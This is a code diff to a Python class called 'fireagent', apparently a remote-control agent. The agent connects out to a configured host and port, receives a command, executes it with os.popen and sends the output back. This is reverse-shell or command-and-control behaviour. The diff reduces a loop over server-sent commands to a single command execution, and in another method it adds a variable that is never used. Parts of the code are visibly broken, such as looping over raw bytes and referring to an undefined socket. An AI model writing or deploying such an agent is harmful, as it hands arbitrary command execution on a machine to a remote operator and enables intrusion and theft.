@@ -36,15 +36,10 @@ class fireagent:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((HOST,PORT))
 		s.sendall(b"$agent-config$")
-		#servers informs agent how many commands to run 
-		commands = s.recv(4096)
-		decoded = commands.decode()
-		print(f"number of commands = {commands.decode()}")
-		for i in decoded:
-			command = s.recv(1024)
-			commandResult = str(os.popen(command.decode()).read())
-			s.sendall(bytes(commandResult, 'UTF-8'))
-			print(commandResult)
+		command = s.recv(1024)
+		commandResult = str(os.popen(command.decode()).read())
+		s.sendall(bytes(commandResult, 'UTF-8'))
+		print(commandResult)
 		#fireagent.serverCommands()	
 
 	def serverCommands():
@@ -57,6 +52,7 @@ class fireagent:
 			auth = serversocket.recv(1024)
 			if auth.startswith(b"$server-auth$"):
 				commands = serversocket.recv(1024)
+				decoded = commands.decode()
 				for i in commands:
 					command = s.recv(1024)
 					print("recieved command from server")
